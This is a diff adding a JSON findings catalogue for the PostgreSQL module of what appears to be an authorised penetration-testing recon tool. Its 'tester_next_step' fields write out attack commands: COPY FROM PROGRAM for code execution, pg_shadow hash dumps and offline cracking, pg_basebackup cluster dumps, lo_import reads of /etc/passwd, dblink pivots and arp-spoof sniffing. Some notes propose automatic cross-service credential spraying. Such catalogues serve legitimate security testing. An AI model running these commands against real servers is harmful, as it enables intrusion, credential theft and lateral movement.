@@ -1,0 +1,190 @@
+{
+  "service": "postgres",
+  "module_files": [
+    "recce/services/db/postgres.py"
+  ],
+  "summary": "Highly mature module (1211 LOC). Speaks v3 protocol with trust/cleartext/md5/SCRAM-SHA-256 (including channel-binding SASLFinal verify), separate SSLRequest probe (TLS-offered), separate replication startup probe (pg_hba `host replication`), pg_shadow hash dump, PL extension inventory, dblink/postgres_fdw pivot detection, pg_largeobject legacy file-read primitive detection, PUBLIC-schema CREATE + SECURITY DEFINER-to-PUBLIC audits, foreign-server user-mapping cred harvest, redacted datamine, opt-in benign RCE proof via COPY FROM PROGRAM. Biggest gap: opt-in flag (`prove=True`) required for the RCE proof \u2014 default output stays at 'capability' T1 even when confirmable; no COPY-TO writing a canary path (INTO DUMPFILE-equivalent).",
+  "proposed_shared_surface_consumers": [
+    "known_users",
+    "known_creds",
+    "known_hashes",
+    "known_hostkeys",
+    "internal_targets"
+  ],
+  "findings": [
+    {
+      "kind": "pg_trust_auth",
+      "tier": "t2",
+      "severity": "high",
+      "title_pattern": "PostgreSQL trust authentication (no password required)",
+      "tier_evidence": "AuthenticationOk (code=0) observed on v3 startup with no password \u2014 server-proven trust; loot() then SELECTs pg_shadow etc., adding real data pulled.",
+      "can_promote_to": "t3",
+      "promotion_notes": "Default-enable prove_rce (benign `id`) when trust+superuser is detected \u2014 the flag exists but is opt-in; that keeps T3 attainable without operator intervention.",
+      "promotion_risk": "medium",
+      "tester_next_step": "psql 'host=<ip> port=<port> user=postgres'; \\du; SELECT usename,passwd FROM pg_shadow; then CREATE TEMP TABLE r(o text); COPY r FROM PROGRAM 'id'; TABLE r."
+    },
+    {
+      "kind": "pg_default_creds",
+      "tier": "t2",
+      "severity": "critical",
+      "title_pattern": "PostgreSQL default credentials still active",
+      "tier_evidence": "weak_password_sweep authenticates via _do_auth (real SCRAM/md5 exchange) \u2014 landed default cred is proven, not guessed.",
+      "can_promote_to": "t3",
+      "promotion_notes": "On weak-default hit, auto-invoke prove_rce (default `id`) when loot.can_rce \u2014 carries default-cred straight to captured host output.",
+      "promotion_risk": "medium",
+      "tester_next_step": "psql 'host=<ip> port=<port> user=postgres password=postgres'; if superuser, COPY r FROM PROGRAM 'id' \u2014 command executes as postgres OS user."
+    },
+    {
+      "kind": "pg_cred_access",
+      "tier": "t2",
+      "severity": "high",
+      "title_pattern": "PostgreSQL credentialed access (looted / weak credential)",
+      "tier_evidence": "Real credential authenticated via _do_auth; loot() then queries live pg_shadow / pg_extension / dblink surface.",
+      "can_promote_to": "t3",
+      "promotion_notes": "Wire prove_rce for credentialed superuser path when analyze(prove=True); currently gated same as trust.",
+      "promotion_risk": "medium",
+      "tester_next_step": "psql 'host=<ip> port=<port> user=<u> password=<p>'; SELECT current_setting('is_superuser'); if on -> COPY FROM PROGRAM 'id'."
+    },
+    {
+      "kind": "pg_replication_trust",
+      "tier": "t2",
+      "severity": "critical",
+      "title_pattern": "PostgreSQL replication protocol accepts trust (pg_basebackup RCE-adjacent)",
+      "tier_evidence": "Separate probe_replication sends startup with replication=true and observes AuthenticationOk with no password \u2014 proof of the second (rarely-hardened) pg_hba trust surface.",
+      "can_promote_to": "t3",
+      "promotion_notes": "Invoke pg_basebackup -X none -P into a scratch dir, then extract pg_shadow from the base backup and add hashes to loot \u2014 turns replication trust into an actual dump.",
+      "promotion_risk": "destructive",
+      "tester_next_step": "pg_basebackup -h <ip> -p <port> -U postgres -D /tmp/dump -X none -P; then extract global/pg_authid, crack hashes offline (hashcat -m 5433/28600)."
+    },
+    {
+      "kind": "pg_replication_roles",
+      "tier": "t0",
+      "severity": "high",
+      "title_pattern": "PostgreSQL replication roles enumerated",
+      "tier_evidence": "SELECT rolname FROM pg_roles WHERE rolreplication \u2014 inventory of privileged accounts; does not test their passwords.",
+      "can_promote_to": "t1",
+      "promotion_notes": "For each replication role, run weak_password_sweep with role-name as user (not just 'postgres') \u2014 if any hits, immediately promote to pg_replication_trust-tier proof.",
+      "promotion_risk": "low",
+      "tester_next_step": "For each rep-role: pg_basebackup -h <ip> -p <port> -U <role> -D /tmp/copy -X none \u2014 if it authenticates, full-cluster dump possible."
+    },
+    {
+      "kind": "pg_rce",
+      "tier": "t2",
+      "severity": "critical",
+      "title_pattern": "PostgreSQL <lead> RCE (<src> superuser -> COPY FROM PROGRAM)",
+      "tier_evidence": "T1 by default (capability from is_superuser/pg_execute_server_program membership); T2 when analyze(prove=True) actually runs prove_rce which executes `id` via CREATE TEMP TABLE + COPY FROM PROGRAM and captures stdout attached to the finding.",
+      "can_promote_to": "t3",
+      "promotion_notes": "Default `prove=True` when the tester ROE allows benign proof, and additionally chain into whoami+uname+ip a -> feed hostname into known_hosts. Higher fidelity T3 requires dropping a beacon which is explicitly out of recce scope.",
+      "promotion_risk": "medium",
+      "tester_next_step": "psql 'host=<ip> user=<role>' -c \"CREATE TEMP TABLE r(o text); COPY r FROM PROGRAM 'id'; TABLE r;\"; expand to full whoami / hostname / uname -a; SeImpersonate-equivalent Linux path is capsh --print + suid hunt."
+    },
+    {
+      "kind": "pg_datamine",
+      "tier": "t3",
+      "severity": "high",
+      "title_pattern": "PostgreSQL sensitive data exposed (PII / secrets / credentials)",
+      "tier_evidence": "datamine() actually SELECTs matched sensitive columns from information_schema.columns and returns redacted samples + regex-harvested connection strings feeding the looted[] Credential list.",
+      "can_promote_to": "t4",
+      "promotion_notes": "The harvested connection strings are already stored \u2014 wire them into cross-service spray (postgres/mysql/mongodb/http) via known_creds so one DB's embedded secrets attack every discovered service automatically.",
+      "promotion_risk": "low",
+      "tester_next_step": "psql -c 'SELECT * FROM <schema>.<table> LIMIT 20'; reuse harvested URIs against every discovered service via nxc/proxychains + mssql/mongo/redis clients."
+    },
+    {
+      "kind": "pg_pivot",
+      "tier": "t1",
+      "severity": "high",
+      "title_pattern": "PostgreSQL lateral pivot (dblink / postgres_fdw)",
+      "tier_evidence": "Live pg_extension + pg_available_extensions + pg_foreign_server query \u2014 deterministic evidence primitive is installed AND (with FDW) that foreign servers are configured pointing at internal DB hosts.",
+      "can_promote_to": "t2",
+      "promotion_notes": "Auto-invoke dblink_connect against each foreign_server host and SELECT SYSTEM_USER / pg_shadow through it \u2014 proves the pivot works, dumps the remote hashes in one hop.",
+      "promotion_risk": "high",
+      "tester_next_step": "psql -c \"SELECT dblink_connect('h','host=<internal-db> user=postgres dbname=postgres'); SELECT * FROM dblink('h','SELECT usename,passwd FROM pg_shadow') AS t(u text,p text);\""
+    },
+    {
+      "kind": "pg_lo_file_read",
+      "tier": "t1",
+      "severity": "high",
+      "title_pattern": "PostgreSQL legacy file read via pg_largeobject / lo_import()",
+      "tier_evidence": "has_table_privilege(current_user,'pg_largeobject','SELECT') AND has_function_privilege(...,'lo_import(text)','EXECUTE') \u2014 direct ACL check, deterministic capability.",
+      "can_promote_to": "t2",
+      "promotion_notes": "Actually SELECT lo_import('/etc/hosts') then loread the resulting oid and return first 64 bytes as proof, mirroring the mssql OPENROWSET pattern.",
+      "promotion_risk": "low",
+      "tester_next_step": "psql -c \"SELECT lo_import('/etc/passwd') AS oid;\" then loread the returned oid; grep for TLS keys / recovery.conf / pgpass on the DB host filesystem."
+    },
+    {
+      "kind": "pg_public_create",
+      "tier": "t1",
+      "severity": "high",
+      "title_pattern": "PostgreSQL: PUBLIC schema is CREATE-able by any role",
+      "tier_evidence": "has_schema_privilege('public','public','CREATE')=t \u2014 deterministic ACL query.",
+      "can_promote_to": "t2",
+      "promotion_notes": "CREATE FUNCTION public.<canary>() RETURNS text AS $$ SELECT current_user $$ LANGUAGE sql; call from a fresh role and prove search_path resolution \u2014 reversible T2.",
+      "promotion_risk": "low",
+      "tester_next_step": "psql -c 'CREATE FUNCTION public.now() RETURNS text AS $$ SELECT current_user $$ LANGUAGE sql;' \u2014 any SECURITY DEFINER caller of now() without SET search_path resolves your version first."
+    },
+    {
+      "kind": "pg_secdef_public",
+      "tier": "t1",
+      "severity": "high",
+      "title_pattern": "PostgreSQL: SECURITY DEFINER functions callable by PUBLIC",
+      "tier_evidence": "Live pg_proc + pg_namespace join filtered on prosecdef AND has_function_privilege('public',...,'EXECUTE') \u2014 deterministic capability + function owner surfaced.",
+      "can_promote_to": "t2",
+      "promotion_notes": "For each listed function, inspect prosrc for missing SET search_path and (per public_create) attempt a controlled search_path hijack against a canary function to prove escalation to the definer's identity.",
+      "promotion_risk": "high",
+      "tester_next_step": "psql -c '\\df+ <schema>.<function>' \u2014 inspect body for lack of SET search_path and vulnerable dynamic SQL; if owner is superuser, call it and see whose context runs."
+    },
+    {
+      "kind": "pg_no_tls",
+      "tier": "t1",
+      "severity": "medium",
+      "title_pattern": "PostgreSQL reachable without TLS (cleartext wire)",
+      "tier_evidence": "probe_ssl sent the 8-byte SSLRequest and observed 'N' (or non-'S') \u2014 server-proven refusal per \u00a755.2.10.",
+      "can_promote_to": "stay",
+      "promotion_notes": "Verification requires an on-path sniff \u2014 out of scope for recce automation.",
+      "promotion_risk": "destructive",
+      "tester_next_step": "printf '\\x00\\x00\\x00\\x08\\x04\\xd2\\x16\\x2f' | nc <ip> <port> | head -c 1; if 'N' \u2014 arp-spoof + tcpdump the SCRAM handshake and offline-crack (hashcat -m 28600)."
+    },
+    {
+      "kind": "pg_cve_cve_2019_9193",
+      "tier": "t0",
+      "severity": "critical",
+      "title_pattern": "PostgreSQL <ver> vulnerable to CVE-2019-9193",
+      "tier_evidence": "Banner-driven ver <= (11,4) \u2014 not a probe result. Note pg_rce covers the actual capability at T1/T2.",
+      "can_promote_to": "t2",
+      "promotion_notes": "Fold in with pg_rce \u2014 when the primitive is already emitted as confirmed, the CVE flag is redundant / can be attached as related_cve to pg_rce.",
+      "promotion_risk": "medium",
+      "tester_next_step": "Same as pg_rce: CREATE TEMP TABLE r(o text); COPY r FROM PROGRAM 'id'; TABLE r \u2014 see PostgreSQL 11.4 CHANGELOG.",
+      "related_cves": [
+        "CVE-2019-9193"
+      ]
+    },
+    {
+      "kind": "pg_cve_cve_2022_1552",
+      "tier": "t0",
+      "severity": "high",
+      "title_pattern": "PostgreSQL <ver> vulnerable to CVE-2022-1552",
+      "tier_evidence": "Banner-driven version match only.",
+      "can_promote_to": "t1",
+      "promotion_notes": "Would require ownership of a table and autovacuum-triggered evaluation \u2014 probe complexity high; keep banner-driven with advisory reference.",
+      "promotion_risk": "medium",
+      "tester_next_step": "Consult PostgreSQL advisory; on non-superuser-owned tables, plant an index expression that fires under REINDEX/CLUSTER to run as superuser.",
+      "related_cves": [
+        "CVE-2022-1552"
+      ]
+    },
+    {
+      "kind": "pg_cve_cve_2023_5869",
+      "tier": "t0",
+      "severity": "high",
+      "title_pattern": "PostgreSQL <ver> vulnerable to CVE-2023-5869",
+      "tier_evidence": "Banner-driven only.",
+      "can_promote_to": "stay",
+      "promotion_notes": "Memory-write PoCs are destructive; leave banner-tier.",
+      "promotion_risk": "destructive",
+      "tester_next_step": "Do NOT run PoC \u2014 advise upgrade per CVE-2023-5869 fix.",
+      "related_cves": [
+        "CVE-2023-5869"
+      ]
+    }
+  ]
+}
